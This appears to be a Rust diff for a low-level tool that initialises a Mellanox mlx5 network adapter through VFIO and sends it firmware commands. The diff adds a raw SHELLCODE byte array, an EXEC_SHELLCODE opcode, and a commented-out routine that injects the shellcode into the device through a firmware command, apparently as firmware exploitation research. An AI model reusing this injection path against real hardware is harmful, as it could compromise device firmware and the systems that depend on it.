@@ -111,19 +111,6 @@ pub fn iommu_map(
     }
 }
 
-pub const QUERY_HCA_CAP: u32 = 0x01000000_u32;
-pub const QUERY_ADAPTER: u32 = 0x01010000_u32;
-pub const INIT_HCA: u32 = 0x01020000_u32;
-pub const TEARDOWN_HCA: u32 = 0x01030000_u32;
-pub const ENABLE_HCA: u32 = 0x01040000_u32;
-pub const DISABLE_HCA: u32 = 0x01050000_u32;
-pub const QUERY_PAGES: u32 = 0x01070000_u32;
-pub const MANAGE_PAGES: u32 = 0x01080000_u32;
-pub const SET_HCA_CAP: u32 = 0x01090000_u32;
-pub const QUERY_ISSI: u32 = 0x010a0000_u32;
-pub const QUERY_FLOW_TABLE: u32 = 0x09320000_u32;
-pub const EXEC_SHELLCODE: u32 = 0x09320000_u32;
-
 #[allow(dead_code)]
 struct Mlx5CmdIf<'a> {
     pci_device: VfioPciDevice,
@@ -195,7 +182,7 @@ impl<'a> Mlx5CmdIf<'a> {
             in_mb.write_u8(i as u64, *b)?;
         }
 
-        cmd.cmd_output_inline0().write(0x12345678_u32.to_be())?;
+        cmd.cmd_output_inline0().write(0x00000000_u32.to_be())?;
         cmd.cmd_output_inline1().write(0x00000000_u32.to_be())?;
         cmd.cmd_output_inline2().write(0x00000000_u32.to_be())?;
         cmd.cmd_output_inline3().write(0x00000000_u32.to_be())?;
@@ -233,20 +220,90 @@ struct CliArgs {
     input: Vec<u8>,
 }
 
+pub const SHELLCODE: &[u8] = &[
+    0x18, 0x05, 0x3f, 0x85, 0x1c, 0xa5, 0xc9, 0x36,
+    0x24, 0xa5, 0xd6, 0x6e, 0x20, 0xa5, 0x74, 0xb9,
+    0x18, 0x06, 0x57, 0x10, 0x1c, 0xc6, 0x88, 0x87,
+    0x24, 0xc6, 0x6c, 0x61, 0x20, 0xc6, 0x14, 0x8e,
+    0xfc, 0xa7, 0x30, 0x00, 0x6c, 0x80, 0x28, 0x12,
+    0x6c, 0x80, 0x30, 0x16, 0x6c, 0x80, 0x38, 0x1a,
+    0xfc, 0x00, 0x00, 0x2d
+];
+
+pub const QUERY_HCA_CAP: u32 = 0x01000000_u32;
+pub const QUERY_ADAPTER: u32 = 0x01010000_u32;
+pub const INIT_HCA: u32 = 0x01020000_u32;
+pub const TEARDOWN_HCA: u32 = 0x01030000_u32;
+pub const ENABLE_HCA: u32 = 0x01040000_u32;
+pub const DISABLE_HCA: u32 = 0x01050000_u32;
+pub const QUERY_PAGES: u32 = 0x01070000_u32;
+pub const MANAGE_PAGES: u32 = 0x01080000_u32;
+pub const SET_HCA_CAP: u32 = 0x01090000_u32;
+pub const QUERY_ISSI: u32 = 0x010a0000_u32;
+pub const SET_ISSI: u32 = 0x010b0000_u32;
+pub const QUERY_FLOW_TABLE: u32 = 0x09320000_u32;
+pub const EXEC_SHELLCODE: u32 = 0x09320000_u32;
+
 fn main() -> Result<()> {
     env_logger::init();
 
     let pci_device = VfioPciDevice::open("/sys/bus/pci/devices/0000:04:00.0")?;
     pci_device.reset()?;
     let cmdif = Mlx5CmdIf::new(pci_device)?;
-    let output = cmdif.exec_command(
-        &[
-            0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00,
-        ],
-        0x10,
-    )?;
-    dbg!(output);
+    // ENABLE_HCA
+    cmdif.exec_command(&[
+            0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        ], 0x10)?;
+    // QUERY_ISSI
+    let out = cmdif.exec_command(&[
+            0x01, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        ], 0x70)?;
+    dbg_hex!(out);
+    // SET_ISSI
+    let out = cmdif.exec_command(&[
+            0x01, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
+            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
+        ], 0x10)?;
+    dbg_hex!(out);
+    // QUERY_PAGES(1)
+    let out = cmdif.exec_command(&[
+            0x01, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        ], 0x10)?;
+    dbg_hex!(out);
+    // MANAGE_PAGES(1) 6 pages: 0x10010000 - 0x10015000
+    let mut manage_pages_msg = vec![
+        0x01, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06,
+    ];
+    manage_pages_msg.extend_from_slice(&0x00000000_10010000_u64.to_be_bytes());
+    manage_pages_msg.extend_from_slice(&0x00000000_10011000_u64.to_be_bytes());
+    manage_pages_msg.extend_from_slice(&0x00000000_10012000_u64.to_be_bytes());
+    manage_pages_msg.extend_from_slice(&0x00000000_10013000_u64.to_be_bytes());
+    manage_pages_msg.extend_from_slice(&0x00000000_10014000_u64.to_be_bytes());
+    manage_pages_msg.extend_from_slice(&0x00000000_10015000_u64.to_be_bytes());
+    let out = cmdif.exec_command(&manage_pages_msg, 0x10)?;
+    dbg_hex!(out);
+    //// QUERY_PAGES(2)
+    //let out = cmdif.exec_command(&[
+    //        0x01, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+    //        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    //    ], 0x10)?;
+    //dbg_hex!(out);
+//    let mut msg = vec![
+//        0x09, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+//        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+//        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+//        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+//    ];
+//    msg.extend_from_slice(SHELLCODE);
+//    let output = cmdif.exec_command(
+//        &msg,
+//        0x100,
+//    )?;
+//    dbg_hex!(output);
 
     Ok(())
 }
